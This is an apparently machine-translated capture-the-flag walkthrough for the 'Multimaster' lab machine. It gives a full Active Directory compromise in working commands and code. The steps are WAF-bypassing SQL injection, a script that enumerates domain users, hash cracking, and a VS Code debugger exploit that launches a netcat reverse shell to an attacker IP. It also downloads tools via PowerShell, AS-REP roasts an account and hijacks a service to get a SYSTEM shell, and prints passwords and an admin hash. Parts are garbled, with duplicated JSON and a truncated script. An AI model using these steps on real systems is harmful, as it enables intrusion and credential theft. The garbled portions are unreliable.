@@ -1,0 +1,280 @@
+nmap -sC -A -v multimaster.htb
+[IMG]
+
+[IMG]
+
+From the scan we see that Windows Server 2016 is on the wheelbarrow , the AD ports (3268, 445, 88, 593, 80) and the AD domain are open. Please login or register to view links
+
+Let's see the web page of this machine:
+[IMG]
+
+This seems to be the MegaCorp site for employees, which we came to as a guest. The site has a corporate calendar, a list of employees, a gallery and a Login button.
+When listing Enum4Linux , gobuster and other tools, I did not find any useful information.
+Then I noticed that if you send an empty request to search for employees, the site gives a list of all employees.
+[IMG]
+
+Let's get a complete list and possibly more information through BurpSuite :
+[IMG]
+
+Intercepting and sending a POST request, in response I received a list of 17 users:
+{"id": 1, "name": "Sarina Bauer", "position": "Junior Developer", "email": "sbauer@megacorp.htb", "src": "sbauer.jpg"}, {" id ": 2," name ":" Octavia Kent "," position ":" Senior Consultant "," email ":" okent@megacorp.htb "," src ":" okent.jpg "}, {" id " : 3, "name": "Christian Kane", "position": "Assistant Manager", "email": "ckane@megacorp.htb", "src": "ckane.jpg"}, {"id": 4 , "name": "Kimberly Page", "position": "Financial Analyst", "email": "kpage@megacorp.htb", "src": "kpage.jpg"}, {"id": 5, " name ":"Shayna Stafford "," position ":" HR Manager "," email ":" shayna@megacorp.htb "," src ":" shayna.jpg "}, {" id ": 6," name ":" James Houston "," position ":" QA Lead "," email ":" james@megacorp.htb "," src ":" james.jpg "}, {" id ": 7," name ":" Connor York ", "position": "Web Developer", "email": "cyork@megacorp.htb", "src": "cyork.jpg"}, {"id": 8, "name": "Reya Martin", "position ":" Tech Support "," email ":" rmartin@megacorp.htb "," src ":" rmartin.jpg "}, {" id ": 9," name ":" Zac Curtis "," position ": "Junior Analyst", "email": "zac@magacorp.htb", "src": "zac.jpg"}, {"id": 10, "name": "Jorden Mclean", "position": "Full-Stack Developer", "email" : "jorden@megacorp.htb", "src": "jorden.jpg"}, {"id": 11, "name": "Alyx Walters", "position": "Automation Engineer", "email": " alyx@megacorp.htb "," src ":" alyx.jpg "}, {" id ": 12," name ":" Ian Lee "," position ":" Internal Auditor "," email ":" ilee @ megacorp.htb "," src ":" ilee.jpg "}, {" id ": 13," name ":" Nikola Bourne "," position ":" Head of Accounts "," email ":" nbourne @ megacorp .htb "," src ":" nbourne.jpg "}, {" id ": 14," name ":" Zachery Powers "," position ":" Credit Analyst "," email ":" zpowers@megacorp.htb "," src ":" zpowers.jpg " }, {"id": 15, "name": "Alessandro Dominguez", "position": "Senior Web Developer", "email": "aldom@megacorp.htb", "src": "aldom.jpg"} , {"id": 16, "name": "MinatoTW", "position": "CEO", "email": "minato@megacorp.htb", "src": "minato.jpg"}, {"id ": 17," name ":" egre55 "," position ":" CEO "," email ":" egre55@megacorp.htb "," src ":" egre55.jpg "}Zachery Powers "," position ":" Credit Analyst "," email ":" zpowers@megacorp.htb "," src ":" zpowers.jpg "}, {" id ": 15," name ":" Alessandro Dominguez "," position ":" Senior Web Developer "," email ":" aldom@megacorp.htb "," src ":" aldom.jpg "}, {" id ": 16," name ":" MinatoTW ", "position": "CEO", "email": "minato@megacorp.htb", "src": "minato.jpg"}, {"id": 17, "name": "egre55", "position": "CEO", "email": "egre55@megacorp.htb", "src": "egre55.jpg"}Zachery Powers "," position ":" Credit Analyst "," email ":" zpowers@megacorp.htb "," src ":" zpowers.jpg "}, {" id ": 15," name ":" Alessandro Dominguez "," position ":" Senior Web Developer "," email ":" aldom@megacorp.htb "," src ":" aldom.jpg "}, {" id ": 16," name ":" MinatoTW ", "position": "CEO", "email": "minato@megacorp.htb", "src": "minato.jpg"}, {"id": 17, "name": "egre55", "position": "CEO", "email": "egre55@megacorp.htb", "src": "egre55.jpg"}zpowers.jpg "}, {" id ": 15," name ":" Alessandro Dominguez "," position ":" Senior Web Developer "," email ":" aldom@megacorp.htb "," src ":" aldom .jpg "}, {" id ": 16," name ":" MinatoTW "," position ":" CEO "," email ":" minato@megacorp.htb "," src ":" minato.jpg "} , {"id": 17, "name": "egre55", "position": "CEO", "email": "egre55@megacorp.htb", "src": "egre55.jpg"}zpowers.jpg "}, {" id ": 15," name ":" Alessandro Dominguez "," position ":" Senior Web Developer "," email ":" aldom@megacorp.htb "," src ":" aldom .jpg "}, {" id ": 16," name ":" MinatoTW "," position ":" CEO "," email ":" minato@megacorp.htb "," src ":" minato.jpg "} , {"id": 17, "name": "egre55", "position": "CEO", "email": "egre55@megacorp.htb", "src": "egre55.jpg"}: "MinatoTW", "position": "CEO", "email": "minato@megacorp.htb", "src": "minato.jpg"}, {"id": 17, "name": "egre55" , "position": "CEO", "email": "egre55@megacorp.htb", "src": "egre55.jpg"}: "MinatoTW", "position": "CEO", "email": "minato@megacorp.htb", "src": "minato.jpg"}, {"id": 17, "name": "egre55" , "position": "CEO", "email": "egre55@megacorp.htb", "src": "egre55.jpg"}
+
+But what to do now ... On the server is WAF which filters the request. After a few minutes, I was able to bypass it using escape unicode characters (\ u0027, \ u0025, etc.):
+Website for encoding / decoding: Please login or register to view links
+
+[IMG]
+
+This means that you can make an SQL injection and access the database. For injection, I will use SQLmap and charunicodeencode tamper, edit the tamper to bypass WAF ( / usr / share / sqlmap / tamper / Please login or register to view links ):
+[IMG]
+
+We will intercept the new POST request via BurpSuite , set the “%” marker for SQLmap in the nmae parameter and save it in the file “ Please login or register to view links ”.
+Let's start the attack and get the database names:
+sqlmap -r post.txt —tamper charunicodeencode —dbs -delay
+PS - Delay needed to bypass WAF
+
+[IMG]
+
+[IMG]
+
+Hooray! We found the base Hub_DB .
+Get the tables:
+sqlmap -r post.txt —tamper charunicodeencode -D Hub_DB —tables -delay 3
+[IMG]
+
+By name, we understand that we are interested in the Logins table , let's dump it!
+sqlmap -r post.txt —tamper charunicodeencode -D Hub_DB -T Logins —dump -delay 5
+PS - Increased the delay so that WAF does not block requests so often :)
+
+[IMG]
+
+But it is worth mentioning that the first time the attack took me more than 3 hours :)
+We got 4 unique password hashes:
+9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739 
+fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa 
+68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813 
+cf17bb4919cab4729d835e734825ef16d47de2d9615733fcba3b6e0a7aa7c53edd986b64bf715d0a2df0015fd090babc
+
+Save the hashes in the file " Please login or register to view links " and decrypt, through hashcat:
+By the look of the hash, this is either SHA-384 or Keccak-384 , by way of poke I realized that it was Keccak-384 .
+hashcat -m 17900 -D 1 -a 0 -n 10 hashes.txt /usr/share/wordlists/rockyou.txt -o out.txt -force
+PS - for brute on vidyuhe: "-D 0" and you can remove "--force"
+
+Passwords:
+password1
+finance1
+banking1
+
+[IMG]
+
+And so, trying to log in with the users that we already have, I couldn’t log in anywhere :)
+We need to get other users. The first thing that came to mind was domain users, but how to get them ...
+After spending 2 days using the tips from the forum Please login or register to view links (not advertising) and reading a bunch of articles, I realized that domain users can be accessed through SQL injection :
+
+Not finding any ready-made scripts, modules, splits, I wrote my script to get domain users: D
+Script under python2.X
+Dependencies: pip install requests && pip install termcolor
+#! / usr / bin / env python 
+
+import requests 
+import re 
+import json 
+import time 
+from termcolor import colored 
+
+def little (s): 
+    try: 
+        t = bytearray.fromhex (s) 
+        t.reverse () 
+        return "" .join (format ( x, "02x") for x in t) .upper () 
+    except: 
+        print colored ("[i] Finished, Domain Accounts are over", "blue") 
+        exit (0) 
+
+if __name__ == "__main__": 
+    i = 1100 
+    SID = "0x0105000000000005150000001C00D1BCD181F1492BDFC236" 
+    #SID = raw_input ("Enter SID:") 
+    URL = "http://10.10.10.179/api/getColleagues" 
+    #URL = raw_input ("Enter URL: ")
+
+    print colored ("\ n \ t + ------------------------------------------ ---------------------------- + "," magenta ") 
+    print colored (" \ t | | "," magenta ") 
+    print colored ("\ t | Enumerating Script For Domain Accounts by M0NET |", "magenta") 
+    print colored ("\ t | SID:" + SID + "|", "magenta") 
+    print colored ("\ t | |" , "magenta") 
+    print colored ("\ t + --------------------------------------- ------------------------------- + \ n \ n "," magenta ") 
+
+    for x in range (1100,6100 , 1000):
+        for i in range (15): 
+            JUNK = "0" + hex ((x + i)) [2:]. upper ()
+            RID = SID + little (JUNK) + 4 * "0" 
+            payload = "- 'union select 1,2,3,4, SUSER_SNAME ({}) - -". Format (RID) 
+            #payload = raw_input ("Enter Payload: ") 
+            pattern = re.compile (r" ([0-9a-f] {2}) ") 
+            encpyload = pattern.sub (r" \\ u00 \ 1 ", payload.encode (" hex ")) 
+            r = requests.post (URL, data = '{"name": "' + encpyload + '"}', headers = {"Content-Type": "application / json; charset = utf-8"}) 
+            if " 403 - Forbidden: Access is denied. " in r.text: 
+                print colored ("[-] Sleeping until WAF cooldown", "red") 
+                time.
+                print colored ("[i] Counter:" + format ((x + i)), "blue") 
+                print colored ("[+] RID:" + format (RID), "green") 
+                print colored ("[+ ] Pyload: "+ payload," green ") 
+                #print colored (" [+] Encoded payload: "+ format (encpayload)," green ") 
+                print colored (" \ n "+ r.text," yellow ") 
+ 
+            jsona = json.loads (r.text) 
+            if jsona: 
+                try: 
+                    for element in jsona: 
+                        del element [u "position"] 
+                        del element [u "id"] 
+                        del element [u "email "] 
+                        del element [u" name "]
+                except TypeError: 
+                    del jsona [u "position"] 
+                    del jsona [u "id"] 
+                    del jsona [u "email"] 
+                    del jsona [u "name"] 
+                data = json.dumps (jsona, sort_keys = True, indent = 4 ) 
+                if "\\" in r.text: 
+                    print colored (data + "\ n", "yellow") 
+            i + = 1
+[IMG]
+
+PS - if the script does not work, format it, this is PiToN))
+
+But first, we need to find out the domain SID for the next generation of RID users, return to the burp and send the request with the payload:
+- 'union select 1,2,3,4, (select (select stuff (upper (sys.fn_varbintohexstr ((SELECT 
+SUSER_SID (' MEGACORP \ Domain Admins'))))), 1, 2, ''))) - -
+We encode our payload in unicode escape, shove the name parameter and send:
+
+[IMG]
+
+Replace the SID in the script and run:
+[IMG]
+
+We got a list of users of the MEGACORP domain :
+Users Offline:
+MegaCorp \\ james
+MegaCorp \\ dai
+MegaCorp \\ tushikikatomo
+MegaCorp \\ zac
+MegaCorp \\ lana
+MegaCorp \\ andrew
+MegaCorp \\ jorden
+MegaCorp \\ alyx
+MegaCorp \\ the Privileged Accounts of IT
+MegaCorp \\ cyork
+MegaCorp \\ rmartin
+Services:
+MEGACORP \\ DnsAdmins
+MEGACORP \\ DnsUpdateProxy
+MEGACORP \\ svc-nas
+MEGACORP \\ svc-sql
+MEGACORP \\ ckane
+MEGACORP \\ kpage
+MEGACORP \\ ilee
+MEGACORP \\ nbourne
+MEGACERS
+
+After 2 minutes with the pens, I found out that the user tushikikatomo has the password finance1 . Connect via Evil-Winrm :
+
+Hooray! User taken! We go to the root: D
+Let's see what we have access to:
+whoami / all
+[IMG]
+
+This user has little access to. Let's see the list of domain users and filter the output:
+Get-ADUser -Filter * -SearchBase "DC = MEGACORP, DC = LOCAL"
+[IMG]
+
+Now it’s worth looking at the list of groups and their members:
+Get-ADgroup -Filter *
+[IMG]
+
+After half an hour, I noticed that the user jorden is in 2 groups: Developers and Server Operators , by name it can be assumed that he has elevated rights. But how to get access to it ... Enumerating with various tools for several hours yielded nothing due to low privileges.
+
+After 2 days of searching, I found everything that we need to continue to use, but it was hard)
+
+And so, according to the prompts from the Please login or register to view links forum (not advertising), I realized that the processes have what we need. Find it!
+Get-process
+[IMG]
+
+The “Code” process catches your eye - this is a Visual Studio Code process . What can be done with it ... I found the LCE vulnerability in the version VS code ( Please login or register to view links ) that we need . This vulnerability uses a local debug port to execute arbitrary js code. Trying to use it for several hours, filling the node, looking for debugging in the manual port, throwing the reverse proxy and using MSF, half of my actions were blocked by Windows Defender and the meterpreter session lived for a maximum of 30 seconds. I googled a wonderful split for this vulnerability - Please login or register to view links , which will allow us to throw a reverse shell in a couple of commands on behalf of the user who launched VS Code.
+Please login or register to view links
+Please login or register to view links
+Please login or register to view links
+
+Fill the split and netcat onto the wheelbarrow using SimpleHTTPServer and PowerShell :
+$ client = new-object System.Net.WebClient 
+$ client.DownloadFile ("http://10.10.14.78:8000/cefdebug.exe", "C: \ tmp \ cefdebug.exe") 
+$ client.DownloadFile ("http : //10.10.14.78: 8000 / nc.exe "," C: \ tmp \ nc.exe ")
+[IMG]
+
+[IMG]
+
+Find the debug port and run the split:
+./cefdebug.exe 
+./cefdebug.exe --url ws: //127.0.0.1: 2737 / 1e9da709-1b1a-4d8f-987c-e63881bfc235 --code "process.mainModule.require ('child_process'). exec (' cmd.exe / c C: /temp/nc.exe 10.10.14.78 6666 -e cmd.exe ') "
+[IMG]
+
+PS - The debug port can change every 10 seconds, so do not hesitate in editing the payload.
+
+We received a shell from the user cyork . Check if he has access to the wwwroot directory . There is access, but there were no credits from the database or something else. At the prompts from the htb forum, in the bin subdirectory I found 2 interesting files: Please login or register to view links and Please login or register to view links , download them!
+[IMG]
+
+Opening dll through notepad, we immediately see the password: D
+MASTER7 {"info": "MegaCorp API"}! Application / json ???? server = localhost; database = Hub_DB; uid = finder; password = D3veL0pM3nT !;
+[IMG]
+
+PS - Of course, this dll could be deregulated in the normal way, but why when is there a notebook)
+
+But connect through Evil-Winrm to the user finder with the password D3veL0pM3nT! failed :(
+The password shows that the user must be a member of the Develoders group . Let's see its members:
+Get-ADGroupMember -Identity Developers
+[IMG]
+
+When I tried to connect to the first user ( sbauer ) from this group, success was waiting for me!
+evil-winrm -i multimaster.htb -u sbauer -p D3veL0pM3nT!
+[IMG]
+
+Having studied this user a bit, I realized that he had nothing special.
+After 2 hours of enumeration and reflection: because Kerberos is used for authentication on the server , you can try to implement the Kerberoasting attack , but here's the problem, there is not a single account with the "DONT_REQ_PREAUTH" flag set. I tried to manually set this flag, and I did it! We use the Please login or register to view links script to request a TGT ticket (hash) from all users with the flag enabled.
+Set-ADAccountControl -Identity jorden -doesnotrequirepreauth $ true
+sudo python3 GetNPUsers.py MEGACORP.local / sbauer: "D3veL0pM3nT!" -dc-ip multimaster.htb -request
+[IMG]
+$krb5asrep$23$jorden@MEGACORP.LOCAL: d6dfe836c01da79bc22c8f8aef60646e $ ca731ecb2ca850f09b6fb44f1b7cd68165bf5604027a1ca3effe9f483becbe4bec9d36648bc2bd0ed8aa21d6f37373ffe54f1ad9bc32ab82e852a8666c93350e802812eb72e02fe05cde3266ccc7850ae7b7dfb411bbe25c9d683bc96fa1e4fd3d894d9fa98cfb47a4d374e02869057796a8d77133d96eec17697ccab83b9ba3aa6651720eb4bca8eaf1436f440f2ea1e19fa5ef4df5d1d9888a388a3f50e29b71af77f21f0afaa4760e8538626af4d45c1ac857bda27c0afca6bbfbf9e93a724b8ad471865e516a1bcd716a8a424d964b4d41582b984f984282d4eb5ec8cbce9e80db571c22505d2ae6d53d1411e95e
+Please login or register to view links
+Please login or register to view links
+Please login or register to view links
+
+Save the hash in the file " Please login or register to view links " and decrypt it using hashcat:
+hashcat -m 18200 -D 1 -a 0 -n 10 hash.txt /usr/share/wordlists/rockyou.txt -o out_jorden.txt --force
+[IMG]
+
+Password:
+rainforest786
+
+Connect via Evil-Winrm using Jordan:
+[IMG]
+
+The WinPEAS enumeration showed that we can manage the services:
+[IMG]
+
+This means that the system already belongs to us)
+We will find any useless service, edit the path to its executable file in the registry and get the reverse shell with system rights: D
+Take the useless data service of the sensors, but at least we will need it to increase the rights)
+REG add HKLM \ System \ CurrentControlSet \ Services \ SensorDataService / v ImagePath / t REG_EXPAND_SZ / d "cmd.exe / c C: \ Users \ jorden \ Documents \ nc.exe 10.10.14.85 9999 -e cmd.exe" / f
+[IMG]
+
+Now fill in the NetCat server and run our service:
+sc.exe start SensorDataService
+[IMG]
+Please login or register to view links
+Please login or register to view links
+
+And pick up Please login or register to view links :
+[IMG]
+
+As a bonus, I will give the NTLM admin hash, but what to do with it, I think everyone knows))
+69cbf4a9b7415c9e1caf93d51d971be0
